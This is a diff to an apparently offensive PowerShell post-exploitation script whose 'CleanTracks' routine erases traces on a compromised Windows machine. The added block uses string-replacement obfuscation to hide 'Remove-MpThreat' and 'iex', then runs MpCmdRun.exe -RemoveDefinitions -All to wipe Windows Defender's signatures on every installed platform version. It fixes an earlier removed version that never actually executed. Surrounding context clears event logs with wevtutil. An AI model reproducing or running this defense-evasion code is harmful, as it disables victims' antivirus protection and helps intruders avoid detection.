@@ -351,6 +351,29 @@ If($CleanTracks -ieq "Clear" -or $CleanTracks -ieq "Paranoid")
       If($Verb -ieq "True"){Start-Sleep -Milliseconds 400;Write-Host "    verbose : nothing-to-see-here"}
    }
 
+   If($IsClientAdmin -Match '^(True)$')
+   {
+      <#
+      .SYNOPSIS
+         Author: @r00t-3xp10it
+         Helper - Remove threats\signatures from defender vault
+      #>
+
+      $IPATH = (Get-Location).Path
+      Try{#Remove threats\signatures from defender vault
+          $RemoveMyName = "@Re@mov@e-@MpTh@re@at" -replace '@',''
+          "$RemoveMyName"|&('Sex' -replace 'S','I')
+          $GetPlatformNumber = (Gci -Path "$Env:PROGRAMDATA\Microsoft\Windows Defender\Platform").Name|Where-Object{$_ -match '^(\d+\.+\d+\d)' }
+          ForEach($PlatformVersion in $GetPlatformNumber)
+          {
+             $MamaMia = ".\Mp@Cm@dR'u@n.e@xe -'Re@m@ov@eD'ef@ini@t'io@ns -@Al@l'|Out-Null" -replace '(@|'')',''
+             cd "$Env:PROGRAMDATA\Microsoft\Windows Defender\Platform\$PlatformVersion"
+             "$MamaMia"|&('SEX' -replace 'S','i')
+          }
+      }Catch{Throw $_}
+      cd $IPATH
+   }
+
 
 
    If($CleanTracks -ieq "Paranoid")
@@ -394,19 +417,6 @@ If($CleanTracks -ieq "Clear" -or $CleanTracks -ieq "Paranoid")
          {
             Write-Host "    Warning : Please wait while we clean Eventvwr." -ForegroundColor Yellow
          }
-
-         #Remove threats\signatures from defender vault
-         Try{
-            $RemoveMyName = "@Re@mov@e-@MpTh@re@at" -replace '@',''
-            $RemoveMyName|&('Sex' -replace 'S','I')
-            $GetPlatformNumber = (Gci -Path "$Env:PROGRAMDATA\Microsoft\Windows Defender\Platform").Name|Where-Object{$_ -match '^(\d+\.+\d+\d)' }
-            ForEach($PlatformVersion in $GetPlatformNumber)
-            {
-               ## Remove all signatures from all installed versions of WD
-               $MamaMia = "-Rem@ov@eDef@ini@tio@ns -@Al@l" -replace '@',''
-               "$Env:PROGRAMDATA\Microsoft\Windows Defender\Platform\$PlatformVersion\MpCmdRun.exe $MamaMia"|Out-Null
-            }
-         }Catch{}
 
          $PSlist = wevtutil el | Where-Object {#Note: wevtutil cl => requires Administrator rigths to run
             $_ -iNotMatch '(Intel|Windows-Audio|Windows-Defrag|Windows-Kernel|Windows-Crypto|Windows-LiveId/Analytic|Windows-LiveId/Operational|Windows-USBVideo/Analytic|/Admin$)'
